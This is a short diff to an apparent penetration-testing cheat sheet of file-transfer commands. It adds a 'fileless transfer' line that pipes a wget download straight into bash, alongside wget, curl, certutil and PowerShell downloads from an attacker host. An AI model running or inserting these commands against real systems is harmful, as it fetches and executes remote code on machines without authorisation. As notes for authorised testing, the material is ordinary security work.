@@ -29,6 +29,9 @@ python3 -m http.server 80
 wget http://$lhost/file.sh -O /tmp/file.sh
 curl http://$lhost/file.sh -o /tmp/file.sh
 
+# Linux fileless transfer
+wget -qO- https://example.com | bash
+
 # Windows target: Download
 certutil -urlcache -f http://$lhost/file.exe file.exe
 powershell -c "iwr http://$lhost/file.exe -o file.exe"
